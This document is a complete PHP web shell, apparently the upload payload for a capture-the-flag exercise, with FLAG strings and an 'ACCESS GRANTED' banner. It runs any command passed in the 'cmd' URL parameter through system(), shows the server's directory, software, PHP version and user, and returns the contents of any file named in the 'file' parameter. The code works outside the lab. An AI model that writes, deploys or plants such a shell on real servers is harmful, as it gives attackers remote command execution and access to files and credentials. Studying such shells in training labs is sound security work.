<?php
// Simple PHP Web Shell
// FLAG{web_shell_uploaded}

echo "<h2 style='color: #00ff00;'>🔴 WEB SHELL ACCESS GRANTED</h2>";
echo "<p>Flag: FLAG{successful_shell_upload}</p>";

if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}

// Show server info
echo "<h3>Server Information:</h3>";
echo "<pre>";
echo "Current directory: " . __DIR__ . "\n";
echo "Server software: " . $_SERVER['SERVER_SOFTWARE'] . "\n";
echo "PHP version: " . phpversion() . "\n";
echo "User: " . get_current_user() . "\n";
echo "</pre>";

// Hidden flag in shell
// FLAG{php_shell_execution}

// Simple file browser
if(isset($_GET['file'])) {
    $file = $_GET['file'];
    if(file_exists($file)) {
        echo "<h3>File: $file</h3>";
        echo "<pre>" . htmlspecialchars(file_get_contents($file)) . "</pre>";
    }
}
?>